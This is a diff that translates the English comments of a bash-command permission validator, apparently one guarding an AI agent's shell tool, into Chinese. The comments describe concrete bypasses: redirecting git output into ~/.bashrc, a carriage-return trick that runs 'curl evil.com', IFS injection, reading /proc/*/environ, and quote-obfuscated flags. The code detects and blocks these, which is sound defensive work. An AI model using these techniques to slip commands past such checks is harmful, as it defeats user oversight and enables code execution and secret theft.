-    // SECURITY: Check remainder for shell operators that could chain commands
-    // or redirect output. The `.*` before `-m` in the regex can swallow flags
-    // like `--amend`, leaving `&& evil` or `> ~/.bashrc` in the remainder.
-    // Previously we only checked for $() / `` / ${} here, missing operators
-    // like ; | & && || < >.
+    // 安全性：检查 remainder 中的 shell 操作符，它们可能链接命令
+    // 或重定向输出。regex 中 `-m` 之前的 `.*` 会吞掉 flags
+    // 如 `--amend`，在 remainder 中留下 `&& evil` 或 `> ~/.bashrc`。
+    // 此前我们只检查 $() / `` / ${}，遗漏了操作符
+    // 如 ; | & && || < >。
     //
-    // `<` and `>` can legitimately appear INSIDE quotes in --author values
-    // like `--author="Name <email>"`. An UNQUOTED `>` is a shell redirect
-    // operator. Because validateGitCommit is an EARLY validator, returning
-    // `allow` here short-circuits bashCommandIsSafe and SKIPS
-    // validateRedirections. So we must bail to passthrough on unquoted `<>`
-    // to let the main validators handle it.
+    // `<` 和 `>` 可以合法地出现在引号内的 --author 值中
+    // 如 `--author="Name <email>"`。未引用的 `>` 是 shell redirect
+    // 操作符。由于 validateGitCommit 是 EARLY 验证器，在此返回
+    // `allow` 会短路 bashCommandIsSafe 并跳过
+    // validateRedirections。所以我们必须对未引用的 `<>` 退回到 passthrough，
+    // 让主验证器处理。
     //
-    // Attack: `git commit --allow-empty -m 'payload' > ~/.bashrc`
-    //   validateGitCommit returns allow → bashCommandIsSafe short-circuits →
-    //   validateRedirections NEVER runs → ~/.bashrc overwritten with git
-    //   stdout containing `payload` → RCE on next shell login.
+    // 攻击：`git commit --allow-empty -m 'payload' > ~/.bashrc`
+    //   validateGitCommit 返回 allow → bashCommandIsSafe 短路 →
+    //   validateRedirections 从不运行 → ~/.bashrc 被包含 `payload` 的 git
+    //   stdout 覆盖 → 下次 shell 登录时 RCE。
     if (remainder && /[;|&()`]|\$\(|\$\{/.test(remainder)) {
       return {
         behavior: 'passthrough',
@@ -685,13 +677,13 @@ function validateGitCommit(context: ValidationContext): PermissionResult {
       }
     }
     if (remainder) {
-      // Strip quoted content, then check for `<` or `>`. Quoted `<>` (email
-      // brackets in --author) are safe; unquoted `<>` are shell redirects.
-      // NOTE: This simple quote tracker has NO backslash handling. `\'`/`\"`
-      // outside quotes would desync it (bash: \' = literal ', tracker: toggles
-      // SQ). BUT line 584 already bailed on ANY backslash in originalCommand,
-      // so we never reach here with backslashes. For backslash-free input,
-      // simple quote toggling is correct (no way to escape quotes without \\).
+      // 剥离引号内容，然后检查 `<` 或 `>`。引号内的 `<>`（--author 中的
+      // email 尖括号）是安全的；未引用的 `<>` 是 shell redirect。
+      // 注意：这个简单的引号跟踪器不处理反斜杠。引号外的 `\'`/`\"`
+      // 会使它失步（bash：\' = 字面 '，跟踪器：切换
+      // SQ）。但第 584 行已对 originalCommand 中的任何反斜杠退出，
+      // 所以不会带反斜杠到达这里。对于无反斜杠输入，
+      // 简单的引号切换是正确的（没有 \\ 就无法转义引号）。
       let unquoted = ''
       let inSQ = false
       let inDQ = false
@@ -715,8 +707,8 @@ function validateGitCommit(context: ValidationContext): PermissionResult {
       }
     }
 
-    // Security hardening: block messages starting with dash
-    // This catches potential obfuscation patterns like git commit -m "---"
+    // 安全加固：屏蔽以 dash 开头的消息
+    // 这可捕获潜在的混淆模式，如 git commit -m "---"
     if (messageContent && messageContent.startsWith('-')) {
       logEvent('tengu_bash_security_check_triggered', {
         checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
@@ -760,8 +752,8 @@ function validateJqCommand(context: ValidationContext): PermissionResult {
     }
   }
 
-  // File arguments are now allowed - they will be validated by path validation in readOnlyValidation.ts
-  // Only block dangerous flags that could read files into jq variables
+  // 文件参数现已允许 —— 它们将由 readOnlyValidation.ts 中的路径验证进行校验
+  // 只屏蔽可能将文件读入 jq 变量的危险 flags
   const afterJq = originalCommand.substring(3).trim()
   if (
     /(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)/.test(
@@ -850,8 +842,8 @@ function validateDangerousPatterns(
 ): PermissionResult {
   const { unquotedContent } = context
 
-  // Special handling for backticks - check for UNESCAPED backticks only
-  // Escaped backticks (e.g., \`) are safe and commonly used in SQL commands
+  // 对反引号的特殊处理 —— 只检查未转义的反引号
+  // 转义的反引号（例如 \`）是安全的，常用于 SQL 命令
   if (hasUnescapedChar(unquotedContent, '`')) {
     return {
       behavior: 'ask',
@@ -859,7 +851,7 @@ function validateDangerousPatterns(
     }
   }
 
-  // Other command substitution checks (include double-quoted content)
+  // 其他命令替换检查（包含双引号内容）
   for (const { pattern, message } of COMMAND_SUBSTITUTION_PATTERNS) {
     if (pattern.test(unquotedContent)) {
       logEvent('tengu_bash_security_check_triggered', {
@@ -905,23 +897,22 @@ function validateRedirections(context: ValidationContext): PermissionResult {
 }
 
 function validateNewlines(context: ValidationContext): PermissionResult {
-  // Use fullyUnquotedPreStrip (before stripSafeRedirections) to prevent bypasses
-  // where stripping `>/dev/null` creates a phantom backslash-newline continuation.
-  // E.g., `cmd \>/dev/null\nwhoami` → after stripping becomes `cmd \\nwhoami`
-  // which looks like a safe continuation but actually hides a second command.
+  // 使用 fullyUnquotedPreStrip（stripSafeRedirections 之前）以防止绕过
+  // 即剥离 `>/dev/null` 会产生幻影反斜杠-换行续行。
+  // 例如 `cmd \>/dev/null\nwhoami` → 剥离后变成 `cmd \\nwhoami`
+  // 看似安全续行，实际隐藏了第二个命令。
   const { fullyUnquotedPreStrip } = context
 
-  // Check for newlines in unquoted content
+  // 检查未引用内容中的换行符
   if (!/[\n\r]/.test(fullyUnquotedPreStrip)) {
     return { behavior: 'passthrough', message: 'No newlines' }
   }
 
-  // Flag any newline/CR followed by non-whitespace, EXCEPT backslash-newline
-  // continuations at word boundaries. In bash, `\<newline>` is a line
-  // continuation (both chars removed), which is safe when the backslash
-  // follows whitespace (e.g., `cmd \<newline>--flag`). Mid-word continuations
-  // like `tr\<newline>aceroute` are still flagged because they can hide
-  // dangerous command names from allowlist checks.
+  // 标记任何后跟非空白的换行/CR，除了词边界的反斜杠-换行续行。
+  // 在 bash 中，`\<newline>` 是行续行（两个字符都被移除），
+  // 当反斜杠后跟空白时是安全的（例如 `cmd \<newline>--flag`）。
+  // 词中续行如 `tr\<newline>aceroute` 仍被标记，因为它们可以
+  // 向 allowlist 检查隐藏危险命令名。
   // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() + gated by /[\n\r]/.test() above
   const looksLikeCommand = /(?<![\s]\\)[\n\r]\s*\S/.test(fullyUnquotedPreStrip)
   if (looksLikeCommand) {
@@ -943,32 +934,32 @@ function validateNewlines(context: ValidationContext): PermissionResult {
 }
 
 /**
- * SECURITY: Carriage return (\r, 0x0D) IS a misparsing concern, unlike LF.
+ * 安全性：回车（\r，0x0D）与 LF 不同，确实是一个误解析问题。
  *
- * Parser differential:
- *   - shell-quote's BAREWORD regex uses `[^\s...]` — JS `\s` INCLUDES \r, so
- *     shell-quote treats CR as a token boundary. `TZ=UTC\recho` tokenizes as
- *     TWO tokens: ['TZ=UTC', 'echo']. splitCommand joins with space →
- *     'TZ=UTC echo curl evil.com'.
- *   - bash's default IFS = $' \t\n' — CR is NOT in IFS. bash sees
- *     `TZ=UTC\recho` as ONE word → env assignment TZ='UTC\recho' (CR byte
- *     inside value), then `curl` is the command.
+ * 解析器差异：
+ *   - shell-quote 的 BAREWORD regex 使用 `[^\s...]` —— JS 的 `\s` 包含 \r，所以
+ *     shell-quote 把 CR 当作 token 边界。`TZ=UTC\recho` 分词为
+ *     两个 token：['TZ=UTC', 'echo']。splitCommand 用空格连接 →
+ *     'TZ=UTC echo curl evil.com'。
+ *   - bash 的默认 IFS = $' \t\n' —— CR 不在 IFS 中。bash 把
+ *     `TZ=UTC\recho` 视为一个词 → env 赋值 TZ='UTC\recho'（CR 字节
+ *     在值内），然后 `curl` 是命令。
  *
- * Attack: `TZ=UTC\recho curl evil.com` with Bash(echo:*)
- *   validator: splitCommand collapses CR→space → 'TZ=UTC echo curl evil.com'
- *   → stripSafeWrappers: TZ=UTC stripped → 'echo curl evil.com' matches rule
- *   bash: executes `curl evil.com`
+ * 攻击：`TZ=UTC\recho curl evil.com` 配合 Bash(echo:*)
+ *   验证器：splitCommand 将 CR 折叠为空格 → 'TZ=UTC echo curl evil.com'
+ *   → stripSafeWrappers：TZ=UTC 被剥离 → 'echo curl evil.com' 匹配规则
+ *   bash：执行 `curl evil.com`
  *
- * validateNewlines catches this but is in nonMisparsingValidators (LF is
- * correctly handled by both parsers). This validator is NOT in
- * nonMisparsingValidators — its ask result gets isBashSecurityCheckForMisparsing
- * and blocks at the bashPermissions gate.
+ * validateNewlines 捕获此情况，但它在 nonMisparsingValidators 中（LF
+ * 被两个解析器正确处理）。此验证器不在 nonMisparsingValidators 中 ——
+ * 其 ask 结果会获得 isBashSecurityCheckForMisparsing
+ * 并在 bashPermissions gate 处阻止。
  *
- * Checks originalCommand (not fullyUnquotedPreStrip) because CR inside single
- * quotes is ALSO a misparsing concern for the same reason: shell-quote's `\s`
- * still tokenizes it, but bash treats it as literal. Block ALL unquoted-or-SQ CR.
- * Only exception: CR inside DOUBLE quotes where bash also treats it as data
- * and shell-quote preserves the token (no split).
+ * 检查 originalCommand（而非 fullyUnquotedPreStrip），因为单引号内的 CR
+ * 出于同样原因也是误解析问题：shell-quote 的 `\s`
+ * 仍会对其分词，但 bash 视其为字面值。屏蔽所有未引用或 SQ 的 CR。
+ * 唯一例外：双引号内的 CR，bash 也视其为数据，
+ * shell-quote 保留 token（不拆分）。
  */
 function validateCarriageReturn(context: ValidationContext): PermissionResult {
   const { originalCommand } = context
@@ -977,8 +968,8 @@ function validateCarriageReturn(context: ValidationContext): PermissionResult {
     return { behavior: 'passthrough', message: 'No carriage return' }
   }
 
-  // Check if CR appears outside double quotes. CR outside DQ (including inside
-  // SQ and unquoted) causes the shell-quote/bash tokenization differential.
+  // 检查 CR 是否出现在双引号之外。双引号外的 CR（包括在
+  // SQ 内和未引用）会导致 shell-quote/bash 分词差异。
   let inSingleQuote = false
   let inDoubleQuote = false
   let escaped = false
@@ -1019,9 +1010,9 @@ function validateCarriageReturn(context: ValidationContext): PermissionResult {
 function validateIFSInjection(context: ValidationContext): PermissionResult {
   const { originalCommand } = context
 
-  // Detect any usage of IFS variable which could be used to bypass regex validation
-  // Check for $IFS and ${...IFS...} patterns (including parameter expansions like ${IFS:0:1}, ${#IFS}, etc.)
-  // Using ${[^}]*IFS to catch all parameter expansion variations with IFS
+  // 检测任何 IFS 变量的使用，可能用于绕过 regex 校验
+  // 检查 $IFS 和 ${...IFS...} 模式（包括参数展开如 ${IFS:0:1}、${#IFS} 等）
+  // 使用 ${[^}]*IFS 捕获所有带 IFS 的参数展开变体
   if (/\$IFS|\$\{[^}]*IFS/.test(originalCommand)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.IFS_INJECTION,
@@ -1037,19 +1028,19 @@ function validateIFSInjection(context: ValidationContext): PermissionResult {
   return { behavior: 'passthrough', message: 'No IFS injection detected' }
 }
 
-// Additional hardening against reading environment variables via /proc filesystem.
-// Path validation typically blocks /proc access, but this provides defense-in-depth.
-// Environment files in /proc can expose sensitive data like API keys and secrets.
+// 额外加固，防止通过 /proc 文件系统读取环境变量。
+// 路径校验通常会屏蔽 /proc 访问，但这提供纵深防御。
+// /proc 中的环境文件可能暴露敏感数据，如 API 密钥和机密。
 function validateProcEnvironAccess(
   context: ValidationContext,
 ): PermissionResult {
   const { originalCommand } = context
 
-  // Check for /proc paths that could expose environment variables
-  // This catches patterns like:
+  // 检查可能暴露环境变量的 /proc 路径
+  // 这会捕获如下模式：
   // - /proc/self/environ
   // - /proc/1/environ
-  // - /proc/*/environ (with any PID)
+  // - /proc/*/environ（任意 PID）
   if (/\/proc\/.*\/environ/.test(originalCommand)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.PROC_ENVIRON_ACCESS,
@@ -1069,17 +1060,16 @@ function validateProcEnvironAccess(
 }
 
 /**
- * Detects commands with malformed tokens (unbalanced delimiters) combined with
- * command separators. This catches potential injection patterns where ambiguous
- * shell syntax could be exploited.
+ * 检测带畸形 token（未平衡的分隔符）并与命令分隔符组合的命令。
+ * 这可捕获歧义 shell 语法可能被利用的潜在注入模式。
  *
- * Security: This check catches the eval bypass discovered in HackerOne review.
- * When shell-quote parses ambiguous patterns like `echo {"hi":"hi;evil"}`,
- * it may produce unbalanced tokens (e.g., `{hi:"hi`). Combined with command
- * separators, this can lead to unintended command execution via eval re-parsing.
+ * 安全性：此检查捕获 HackerOne 审查中发现的 eval 绕过。
+ * 当 shell-quote 解析歧义模式如 `echo {"hi":"hi;evil"}` 时，
+ * 可能产生未平衡的 token（例如 `{hi:"hi`）。与命令分隔符组合后，
+ * 可通过 eval 重新解析导致非预期命令执行。
  *
- * By forcing user approval for these patterns, we ensure the user sees exactly
- * what will be executed before approving.
+ * 通过强制用户批准这些模式，我们确保用户在批准前确切看到
+ * 将要执行的内容。
  */
 function validateMalformedTokenInjection(
   context: ValidationContext,
@@ -1088,7 +1078,7 @@ function validateMalformedTokenInjection(
 
   const parseResult = tryParseShellCommand(originalCommand)
   if (!parseResult.success) {
-    // Parse failed - this is handled elsewhere (bashToolHasPermission checks this)
+    // 解析失败 —— 在其他地方处理（bashToolHasPermission 检查此情况）
     return {
       behavior: 'passthrough',
       message: 'Parse failed, handled elsewhere',
@@ -1097,7 +1087,7 @@ function validateMalformedTokenInjection(
 
   const parsed = parseResult.tokens
 
-  // Check for command separators (;, &&, ||)
+  // 检查命令分隔符（;、&&、||）
   const hasCommandSeparator = parsed.some(
     entry =>
       typeof entry === 'object' &&
@@ -1110,7 +1100,7 @@ function validateMalformedTokenInjection(
     return { behavior: 'passthrough', message: 'No command separators' }
   }
 
-  // Check for malformed tokens (unbalanced delimiters)
+  // 检查畸形 token（未平衡的分隔符）
   if (hasMalformedTokens(originalCommand, parsed)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.MALFORMED_TOKEN_INJECTION,
@@ -1130,13 +1120,13 @@ function validateMalformedTokenInjection(
 }
 
 function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
-  // Block shell quoting bypass patterns used to circumvent negative lookaheads we use in our regexes to block known dangerous flags
+  // 屏蔽用于绕过我们 regex 中负向先行断言以屏蔽已知危险 flag 的 shell 引用绕过模式
 
   const { originalCommand, baseCommand } = context
 
-  // Echo is safe for obfuscated flags, BUT only for simple echo commands.
-  // For compound commands (with |, &, ;), we need to check the whole command
-  // because the dangerous ANSI-C quoting might be after the operator.
+  // echo 对混淆 flag 是安全的，但仅限简单 echo 命令。
+  // 对于复合命令（带 |、&、;），我们需要检查整个命令，
+  // 因为危险的 ANSI-C 引用可能在操作符之后。
   const hasShellOperators = /[|&;]/.test(originalCommand)
   if (baseCommand === 'echo' && !hasShellOperators) {
     return {
@@ -1145,15 +1135,15 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     }
   }
 
-  // COMPREHENSIVE OBFUSCATION DETECTION
-  // These checks catch various ways to hide flags using shell quoting
+  // 全面混淆检测
+  // 这些检查捕获使用 shell 引用隐藏 flag 的各种方式
 
-  // 1. Block ANSI-C quoting ($'...') - can encode any character via escape sequences
-  // Simple pattern that matches $'...' anywhere. This correctly handles:
-  // - grep '$' file => no match ($ is regex anchor inside quotes, no $'...' structure)
-  // - 'test'$'-exec' => match (quote concatenation with ANSI-C)
-  // - Zero-width space and other invisible chars => match
-  // The pattern requires $' followed by content (can be empty) followed by closing '
+  // 1. 屏蔽 ANSI-C 引用（$'...'）—— 可通过转义序列编码任意字符
+  // 简单模式，匹配任何位置的 $'...'。正确处理：
+  // - grep '$' file => 不匹配（$ 是引号内的 regex 锚点，无 $'...' 结构）
+  // - 'test'$'-exec' => 匹配（引号与 ANSI-C 拼接）
+  // - 零宽空格和其他不可见字符 => 匹配
+  // 模式要求 $' 后跟内容（可为空）再后跟闭合 '
   if (/\$'[^']*'/.test(originalCommand)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
@@ -1165,8 +1155,8 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     }
   }
 
-  // 2. Block locale quoting ($"...")  - can also use escape sequences
-  // Same simple pattern as ANSI-C quoting above
+  // 2. 屏蔽 locale 引用（$"..."） —— 也可使用转义序列
+  // 与上面 ANSI-C 引用相同的简单模式
   if (/\$"[^"]*"/.test(originalCommand)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
@@ -1178,8 +1168,8 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     }
   }
 
-  // 3. Block empty ANSI-C or locale quotes followed by dash
-  // $''-exec or $""-exec
+  // 3. 屏蔽空的 ANSI-C 或 locale 引用后跟 dash
+  // $''-exec 或 $""-exec
   if (/\$['"]{2}\s*-/.test(originalCommand)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
@@ -1192,9 +1182,9 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     }
   }
 
-  // 4. Block ANY sequence of empty quotes followed by dash
-  // This catches: ''-  ""-  ''""-  ""''-  ''""''-  etc.
-  // The pattern looks for one or more empty quote pairs followed by optional whitespace and dash
+  // 4. 屏蔽任何后跟 dash 的空引号序列
+  // 这会捕获：''-  ""-  ''""-  ""''-  ''""''-  等
+  // 模式查找一个或多个空引号对后跟可选空白和 dash
   if (/(?:^|\s)(?:''|"")+\s*-/.test(originalCommand)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
@@ -1206,36 +1196,35 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     }
   }
 
-  // 4b. SECURITY: Block homogeneous empty quote pair(s) immediately adjacent
-  // to a quoted dash. Patterns like `"""-f"` (empty `""` + quoted `"-f"`)
-  // concatenate in bash to `-f` but slip past all the above checks:
-  //   - Regex (4) above: `(?:''|"")+\s*-` matches `""` pair, then expects
-  //     optional space and dash — but finds a third `"` instead. No match.
-  //   - Quote-content scanner (below): Sees the first `""` pair with empty
-  //     content (doesn't start with dash). The third `"` opens a new quoted
-  //     region handled by the main quote-state tracker.
-  //   - Quote-state tracker: `""` toggles inDoubleQuote on/off; third `"`
-  //     opens it again. The `-` inside `"-f"` is INSIDE quotes → skipped.
-  //   - Flag scanner: Looks for `\s` before `-`. The `-` is preceded by `"`.
-  //   - fullyUnquotedContent: Both `""` and `"-f"` get stripped.
+  // 4b. 安全性：屏蔽紧邻引号 dash 的同质空引号对。模式如 `"""-f"`
+  // （空 `""` + 引号 `"-f"`）在 bash 中拼接为 `-f`，但能绕过上述所有检查：
+  //   - 上面 regex (4)：`(?:''|"")+\s*-` 匹配 `""` 对，然后期望
+  //     可选空格和 dash —— 但找到第三个 `"`。不匹配。
+  //   - 引号内容扫描器（下方）：看到第一个 `""` 对，内容为空
+  //     （不以 dash 开头）。第三个 `"` 开启新的引号区域，
+  //     由主引号状态跟踪器处理。
+  //   - 引号状态跟踪器：`""` 切换 inDoubleQuote 开/关；第三个 `"`
+  //     再次开启。`"-f"` 内的 `-` 在引号内 → 被跳过。
+  //   - Flag 扫描器：查找 `-` 前的 `\s`。`-` 前是 `"`。
+  //   - fullyUnquotedContent：`""` 和 `"-f"` 都被剥离。
   //
-  // In bash, `"""-f"` = empty string + string "-f" = `-f`. This bypass works
-  // for ANY dangerous-flag check (jq -f, find -exec, fc -e) with a matching
-  // prefix permission (Bash(jq:*), Bash(find:*)).
+  // 在 bash 中，`"""-f"` = 空字符串 + 字符串 "-f" = `-f`。此绕过对
+  // 任何危险 flag 检查（jq -f、find -exec、fc -e）都有效，
+  // 只要有匹配的 prefix 权限（Bash(jq:*)、Bash(find:*)）。
   //
-  // The regex `(?:""|'')+['"]-` matches:
-  //   - One or more HOMOGENEOUS empty pairs (`""` or `''`) — the concatenation
-  //     point where bash joins the empty string to the flag.
-  //   - Immediately followed by ANY quote char — opens the flag-quoted region.
-  //   - Immediately followed by `-` — the obfuscated flag.
+  // regex `(?:""|'')+['"]-` 匹配：
+  //   - 一个或多个同质空对（`""` 或 `''`）—— bash 将空字符串
+  //     拼接到 flag 的拼接点。
+  //   - 紧跟任意引号字符 —— 开启 flag 引号区域。
+  //   - 紧跟 `-` —— 混淆的 flag。
   //
-  // POSITION-AGNOSTIC: We do NOT require word-start (`(?:^|\s)`) because
-  // prefixes like `$x"""-f"` (unset/empty variable) concatenate the same way.
-  // The homogeneous-empty-pair requirement filters out the `'"'"'` idiom
-  // (no homogeneous empty pair — it's close, double-quoted-content, open).
+  // 位置无关：我们不要求词首（`(?:^|\s)`），因为
+  // prefix 如 `$x"""-f"`（未设置/空变量）以同样方式拼接。
+  // 同质空对要求过滤掉 `'"'"'` 惯用法
+  // （无同质空对 —— 它是 close、双引号内容、open）。
   //
-  // FALSE POSITIVE: Matches `echo '"""-f" text'` (pattern inside single-quoted
-  // string). Extremely rare (requires echoing the literal attack). Acceptable.
+  // 假阳性：匹配 `echo '"""-f" text'`（单引号字符串内的模式）。
+  // 极罕见（需要 echo 字面攻击）。可接受。
   if (/(?:""|'')+['"]-/.test(originalCommand)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
@@ -1248,10 +1237,10 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     }
   }
 
-  // 4c. SECURITY: Also block 3+ consecutive quotes at word start even without
-  // an immediate dash. Broader safety net for multi-quote obfuscation patterns
-  // not enumerated above (e.g., `"""x"-f` where content between quotes shifts
-  // the dash position). Legitimate commands never need `"""x"` when `"x"` works.
+  // 4c. 安全性：也屏蔽词首 3 个或更多连续引号，即使没有
+  // 紧跟 dash。为上面未枚举的多引号混淆模式提供更广的安全网
+  // （例如 `"""x"-f`，引号间内容移动了 dash 位置）。
+  // 合法命令从不需要 `"""x"`（当 `"x"` 就能用时）。
   if (/(?:^|\s)['"]{3,}/.test(originalCommand)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
@@ -1264,7 +1253,7 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     }
   }
 
-  // Track quote state to avoid false positives for flags inside quoted strings
+  // 跟踪引号状态以避免引号字符串内 flag 的假阳性
   let inSingleQuote = false
   let inDoubleQuote = false
   let escaped = false
@@ -1273,24 +1262,24 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     const currentChar = originalCommand[i]
     const nextChar = originalCommand[i + 1]
 
-    // Update quote state
+    // 更新引号状态
     if (escaped) {
       escaped = false
       continue
     }
 
-    // SECURITY: Only treat backslash as escape OUTSIDE single quotes. In bash,
-    // `\` inside `'...'` is LITERAL. Without this guard, `'\'` desyncs the
-    // quote tracker: `\` sets escaped=true, closing `'` is consumed by the
-    // escaped-skip above instead of toggling inSingleQuote. Parser stays in
-    // single-quote mode, and the `if (inSingleQuote || inDoubleQuote) continue`
-    // at line ~1121 skips ALL subsequent flag detection for the rest of the
-    // command. Example: `jq '\' "-f" evil` — bash gets `-f` arg, but desynced
-    // parser thinks ` "-f" evil` is inside quotes → flag detection bypassed.
-    // Defense-in-depth: hasShellQuoteSingleQuoteBug catches `'\'` patterns at
-    // line ~1856 before this runs. But we fix the tracker for consistency with
-    // the CORRECT implementations elsewhere in this file (hasBackslashEscaped*,
-    // extractQuotedContent) which all guard with `!inSingleQuote`.
+    // 安全性：只在单引号外把反斜杠视为转义。在 bash 中，
+    // `'...'` 内的 `\` 是字面值。没有此保护，`'\'` 会使引号
+    // 跟踪器失步：`\` 设置 escaped=true，闭合 `'` 被上面的
+    // escaped-skip 消费，而不是切换 inSingleQuote。解析器保持在
+    // 单引号模式，并且第 ~1121 行的 `if (inSingleQuote || inDoubleQuote) continue`
+    // 跳过命令剩余部分的所有后续 flag 检测。
+    // 示例：`jq '\' "-f" evil` —— bash 得到 `-f` 参数，但失步的
+    // 解析器认为 ` "-f" evil` 在引号内 → flag 检测被绕过。
+    // 纵深防御：hasShellQuoteSingleQuoteBug 在第 ~1856 行
+    // 此处运行前捕获 `'\'` 模式。但我们修复跟踪器以与
+    // 本文件其他地方的 CORRECT 实现（hasBackslashEscaped*、
+    // extractQuotedContent）保持一致，它们都用 `!inSingleQuote` 保护。
     if (currentChar === '\\' && !inSingleQuote) {
       escaped = true
       continue
@@ -1306,16 +1295,16 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
       continue
     }
 
-    // Only look for flags when not inside quoted strings
-    // This prevents false positives like: make test TEST="file.py -v"
+    // 只在不在引号字符串内时查找 flags
+    // 这防止假阳性，如：make test TEST="file.py -v"
     if (inSingleQuote || inDoubleQuote) {
       continue
     }
 
-    // Look for whitespace followed by quote that contains a dash (potential flag obfuscation)
-    // SECURITY: Block ANY quoted content starting with dash - err on side of safety
-    // Catches: "-"exec, "-file", "--flag", '-'output, etc.
-    // Users can approve manually if legitimate (e.g., find . -name "-file")
+    // 查找后跟含 dash 的引号的空白（潜在 flag 混淆）
+    // 安全性：屏蔽任何以 dash 开头的引号内容 —— 宁可保守
+    // 捕获："-"exec、"-file"、"--flag"、'-'output 等
+    // 如果合法，用户可手动批准（例如 find . -name "-file"）
     if (
       currentChar &&
       nextChar &&
@@ -1323,57 +1312,57 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
       /['"`]/.test(nextChar)
     ) {
       const quoteChar = nextChar
-      let j = i + 2 // Start after the opening quote
+      let j = i + 2 // 从开引号之后开始
       let insideQuote = ''
 
-      // Collect content inside the quote
+      // 收集引号内的内容
       while (j < originalCommand.length && originalCommand[j] !== quoteChar) {
         insideQuote += originalCommand[j]!
         j++
       }
 
-      // If we found a closing quote and the content looks like an obfuscated flag, block it.
-      // Three attack patterns to catch:
-      //   1. Flag name inside quotes: "--flag", "-exec", "-X" (dashes + letters inside)
-      //   2. Split-quote flag: "-"exec, "--"output (dashes inside, letters continue after quote)
-      //   3. Chained quotes: "-""exec" (dashes in first quote, second quote contains letters)
-      // Pure-dash strings like "---" or "--" followed by whitespace/separator are separators,
-      // not flags, and should not trigger this check.
+      // 如果找到闭合引号且内容看起来像混淆 flag，则屏蔽。
+      // 要捕获的三种攻击模式：
+      //   1. 引号内的 flag 名："--flag"、"-exec"、"-X"（引号内有 dash + 字母）
+      //   2. 分裂引号 flag："-"exec、"--"output（引号内有 dash，字母在引号后继续）
+      //   3. 链式引号："-""exec"（第一个引号有 dash，第二个引号含字母）
+      // 纯 dash 字符串如 "---" 或 "--" 后跟空白/分隔符是分隔符，
+      // 不是 flag，不应触发此检查。
       const charAfterQuote = originalCommand[j + 1]
-      // Inside double quotes, $VAR and `cmd` expand at runtime, so "-$VAR" can
-      // become -exec. Blocking $ and ` here over-blocks single-quoted literals
-      // like grep '-$' (where $ is literal), but main's startsWith('-') already
-      // blocked those — this restores status quo, not a new false positive.
-      // Brace expansion ({) does NOT happen inside quotes, so { is not needed here.
+      // 双引号内，$VAR 和 `cmd` 在运行时展开，所以 "-$VAR" 可
+      // 变为 -exec。在此屏蔽 $ 和 ` 会过度屏蔽单引号字面值
+      // 如 grep '-$'（其中 $ 是字面值），但 main 的 startsWith('-') 已
+      // 屏蔽了那些 —— 这恢复了原状，不是新的假阳性。
+      // 花括号展开（{）在引号内不会发生，所以这里不需要 {。
       const hasFlagCharsInside = /^-+[a-zA-Z0-9$`]/.test(insideQuote)
-      // Characters that can continue a flag after a closing quote. This catches:
-      //   a-zA-Z0-9: "-"exec → -exec (direct concatenation)
-      //   \\:        "-"\exec → -exec (backslash escape is stripped)
-      //   -:         "-"-output → --output (extra dashes)
-      //   {:         "-"{exec,delete} → -exec -delete (brace expansion)
-      //   $:         "-"$VAR → -exec when VAR=exec (variable expansion)
-      //   `:         "-"`echo exec` → -exec (command substitution)
-      // Note: glob chars (*?[) are omitted — they require attacker-controlled
-      // filenames in CWD to exploit, and blocking them would break patterns
-      // like `ls -- "-"*` for listing files that start with dash.
+      // 闭合引号后可继续 flag 的字符。这会捕获：
+      //   a-zA-Z0-9："-"exec → -exec（直接拼接）
+      //   \\:        "-"\exec → -exec（反斜杠转义被剥离）
+      //   -:         "-"-output → --output（额外 dash）
+      //   {:         "-"{exec,delete} → -exec -delete（花括号展开）
+      //   $:         "-"$VAR → -exec 当 VAR=exec（变量展开）
+      //   `:         "-"`echo exec` → -exec（命令替换）
+      // 注意：glob 字符（*?[）被省略 —— 它们需要攻击者控制的
+      // CWD 文件名才能利用，屏蔽它们会破坏模式
+      // 如 `ls -- "-"*` 用于列出以 dash 开头的文件。
       const FLAG_CONTINUATION_CHARS = /[a-zA-Z0-9\\${`-]/
       const hasFlagCharsContinuing =
         /^-+$/.test(insideQuote) &&
         charAfterQuote !== undefined &&
         FLAG_CONTINUATION_CHARS.test(charAfterQuote)
-      // Handle adjacent quote chaining: "-""exec" or "-""-"exec or """-"exec concatenates
-      // to -exec in shell. Follow the chain of adjacent quoted segments until
-      // we find one containing an alphanumeric char or hit a non-quote boundary.
-      // Also handles empty prefix quotes: """-"exec where "" is followed by "-"exec
-      // The combined segments form a flag if they contain dash(es) followed by alphanumerics.
+      // 处理相邻引号链："-""exec" 或 "-""-"exec 或 """-"exec 在 shell 中
+      // 拼接为 -exec。沿着相邻引号段链直到
